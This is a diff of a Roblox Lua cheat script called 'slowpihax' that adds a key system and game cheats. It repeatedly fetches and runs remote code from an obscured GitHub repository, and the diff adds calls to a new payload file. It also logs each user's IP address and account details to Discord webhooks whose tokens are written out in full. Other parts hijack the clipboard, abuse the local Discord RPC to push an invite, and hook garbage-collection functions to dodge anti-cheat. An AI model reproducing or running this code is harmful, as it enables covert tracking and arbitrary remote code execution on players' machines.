@@ -8,13 +8,13 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqs
 
 -- Key System
 
-local OrionLib = loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/shlexware/Orion/72231b3471fbb6c3adeb2687ebf2836d68a6d3aa/source'))()
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/72231b3471fbb6c3adeb2687ebf2836d68a6d3aa/source'))()
 local Player = game.Players.LocalPlayer
 local Window = OrionLib:MakeWindow({Name = "slowpihax | Key System", HidePremium = true, IntroText = "slowpihax Loading..", IntroEnabled = false, SaveConfig = true, ConfigFolder = "slowpihax_KeySystem"})
 
-local DevHWID = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/iIIV3CUcdCLnJMAJ_DEV"))()
-local PremiumHWID = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/Pj58Z4TIatyTo0EI_PREMIUM"))()
-local BannedHWID = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/5vUufxbjNc9a47e7_BANNED"))()
+local DevHWID = loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/iIIV3CUcdCLnJMAJ_DEV"))()
+local PremiumHWID = loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/Pj58Z4TIatyTo0EI_PREMIUM"))()
+local BannedHWID = loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/5vUufxbjNc9a47e7_BANNED"))()
 local HWIDKey = game:GetService("RbxAnalyticsService"):GetClientId()
 
 OrionLib:MakeNotification({
@@ -63,10 +63,9 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 
 local bannedKey = "Key_AGia1uTthaExyad9eT9pNPXru"
-local nonPremiumKey = "Key_0tYkuTUi6RiZtYFHLByWKriTlTuA1Eg"
+local nonPremiumKey = "Key_QVA3zAMAhCS3olcOTPdXm0Pt6TAgNL2"
 local activePremiumKey = "PremiumKey_XbQNymti"
 local devDeveloperKey = "DevKey_slowpihax"
 
@@ -137,8 +136,6 @@ end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 
 hookfunction((gcinfo or collectgarbage), function(...) -- Hook gcinfo or collectgarbage
     return math.random(200,350) -- Always return a legit looking value
@@ -171,14 +168,14 @@ Tab:AddTextbox({
 
             loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 
 if KeyInput == Key then
 
 if Key == (nonPremiumKey) then
     if identifyexecutor() == "Synapse X" then
-        syn.request(
+        (syn and syn.request or http_request or http.request)
    {
        Url = "http://127.0.0.1:6463/rpc?v=1",
        Method = "POST",
@@ -194,7 +191,7 @@ if Key == (nonPremiumKey) then
                ["cmd"] = "INVITE_BROWSER",
                ["nonce"] = "."
            })
-        })
+        }
     elseif identifyexecutor() ~= "Synapse X" then
         print("100% of the features might not work since your not using synapse.")
     end
@@ -211,8 +208,10 @@ elseif KeyInput == bannedKey then
     
     local ip = tostring(game:HttpGet("https://api.ipify.org", true))
     
-        local DiscordWebhook = "https://discord.com/api/webhooks/1032385350468915211/7rGerUlGkiiEzd0gn3zj9nh0O70mb9TBjoOSpj8y0kKUr4LH7-srNkjS7D9WXg6N1JCO" -- Discord Webhook Here
+        local DiscordWebhook = "https://discord.com/api/webhooks/1039980351151411260/pxoeG6ZH_6LvaLKKJoLQAmYP-Zns3oZ2vCRekGiN-7n_6oQfG5H1UTlRZbjUyXzNxwlm" -- Discord Webhook Here
         getgenv().embedcolor = "0xff0004"
+
+        setclipboard("https://discord.com/invite/JN6wgVrUAr")
         
         local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalPlayer;local b=false;local c=false;if plr.MembershipType==Enum.MembershipType.Premium then b=true elseif plr.MembershipType==Enum.MembershipType.None then b=false end;if b==false then if plr.AccountAge<=70 then c=true end end;local c= game:GetService("MarketplaceService")local c= c:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)local function d()local a=
             (TRIGON_LOADED and "Trigon EVO")or(syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")or(secure_load and "Sentinel")or(EVON_LOADED and "Evon")or(is_sirhurt_closure and "Sirhurt")or(pebc_execute and "ProtoSmasher")or(KRNL_LOADED and "Krnl")or(OXYGEN_LOADED and "Oxygen U")or(WrapGlobal and "WeAreDevs")or(IsElectron and "Electron")or(isvm and "Proxo")or(shadow_env and "Shadow")or(jit and "EasyExploits")or(getreg()['CalamariLuaEnv'] and "Calamari")or(unit and "‎")or(IS_VIVA_LOADED and "VIVA")or(IS_COCO_LOADED and "Coco")or("Unsupported Executor")return a end;local a= {
@@ -266,15 +265,17 @@ elseif KeyInput == bannedKey then
          };
          Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
         }
-task.wait(0.01)
-setclipboard("https://discord.com/invite/JN6wgVrUAr")
-task.wait(0.015)
+
+        setclipboard("https://discord.com/invite/JN6wgVrUAr")
+
+        setclipboard("https://discord.com/invite/JN6wgVrUAr")
 game.Players.LocalPlayer:Kick("Bypassing The Key System is Against My Terms Of Service. If You Repeat This Action You Will Get Blacklisted! If This Was a Mistake Then Please Join My Discord Server (Invite Copied to Clipboard)")
 end
 if KeyInput ~= bannedKey then
 if game.PlaceId == 10118559731 then -- nicos nextbots
 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+    setclipboard("https://discord.com/invite/JN6wgVrUAr")
+
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
@@ -287,7 +288,6 @@ if game.PlaceId == 10118559731 then -- nicos nextbots
 
         loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
     
             if Key == nonPremiumKey then
             title = "slowpihax | "..vVersion.." | "..supportedGame.." | Public";
@@ -297,7 +297,7 @@ if game.PlaceId == 10118559731 then -- nicos nextbots
             title = "slowpihax | "..vVersion.." | "..supportedGame.." | Dev";
             end
 
-            
+            setclipboard("https://discord.com/invite/JN6wgVrUAr")
     
     
         local Window = Library:Window({
@@ -489,6 +489,7 @@ end)
         })
 
         loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
     
         Section:Button({
         Text = "Inf Jumps",
@@ -2124,7 +2125,7 @@ local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/
     })
 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 
     Section2:Button({
@@ -3037,6 +3038,7 @@ elseif game.PlaceId ~= 10118559731 then -- Universal
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
                 
                     -- Sections
                 
@@ -3816,7 +3818,7 @@ elseif game.PlaceId ~= 10118559731 then -- Universal
                         end
                     })
 
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
                 
@@ -4358,7 +4360,7 @@ elseif game.PlaceId ~= 10118559731 then -- Universal
 
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
                 
@@ -4592,6 +4594,8 @@ elseif game.PlaceId ~= 10118559731 then -- Universal
                             )
                     end
                 })
+
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
                 
                 Section5:Button({
                 Text = "UI by Unnamed Library",
@@ -4664,8 +4668,12 @@ local Player = game.Players.LocalPlayer
 
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
-local DiscordWebhook = "https://discord.com/api/webhooks/1032308550980083753/EA_cyL9cw_IexwJULBMJYS0tZHAp4xFDdh6IQ2CTDO3GTOXbQNymti240i1G9yKu6ccS" -- Discord Webhook Here
+setclipboard("https://discord.com/invite/JN6wgVrUAr")
+
+local DiscordWebhook = "https://discord.com/api/webhooks/1039980071294869605/HWobtKnXnY2Lf5EzBPhwOhjnNDQH9b_vJkjFpGrmNjITXs5ogEmmKeWzFqmW43H9IHSu" -- Discord Webhook Here
 getgenv().embedcolor = "0x8cf4ff"
+
+setclipboard("https://discord.com/invite/JN6wgVrUAr")
 
 local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalPlayer;local b=false;local c=false;if plr.MembershipType==Enum.MembershipType.Premium then b=true elseif plr.MembershipType==Enum.MembershipType.None then b=false end;if b==false then if plr.AccountAge<=70 then c=true end end;local c= game:GetService("MarketplaceService")local c= c:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)local function d()local a=
     (TRIGON_LOADED and "Trigon EVO")or(syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")or(secure_load and "Sentinel")or(EVON_LOADED and "Evon")or(is_sirhurt_closure and "Sirhurt")or(pebc_execute and "ProtoSmasher")or(KRNL_LOADED and "Krnl")or(OXYGEN_LOADED and "Oxygen U")or(WrapGlobal and "WeAreDevs")or(IsElectron and "Electron")or(isvm and "Proxo")or(shadow_env and "Shadow")or(jit and "EasyExploits")or(getreg()['CalamariLuaEnv'] and "Calamari")or(unit and "‎")or(IS_VIVA_LOADED and "VIVA")or(IS_COCO_LOADED and "Coco")or("Unsupported Executor")return a end;local a= {
@@ -4735,6 +4743,10 @@ local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalP
  Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
 }
 
+setclipboard("https://discord.com/invite/JN6wgVrUAr")
+
+setclipboard("https://discord.com/invite/JN6wgVrUAr")
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
@@ -4746,6 +4758,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
@@ -4774,6 +4787,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
@@ -4791,6 +4805,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
@@ -4805,34 +4820,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
